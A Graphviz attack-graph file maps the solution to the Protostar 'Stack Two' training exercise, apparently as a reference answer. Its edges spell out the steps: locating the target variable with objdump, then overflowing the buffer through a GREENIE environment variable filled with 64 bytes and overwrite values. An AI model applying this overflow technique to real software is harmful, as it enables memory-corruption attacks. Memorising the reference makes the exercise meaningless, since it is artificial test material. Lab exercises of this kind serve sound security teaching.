digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Stack Two"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="GREENIE target value identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="GREENIE payload exported"];
  node2 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="modified set via environment"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d /opt/protostar/bin/stack2 | grep -i modified"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="export GREENIE=$(python -c 'print \"A\"*64 + \"\\x0a\\x0d\\x0a\\x0d\"')"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/stack2"];
}
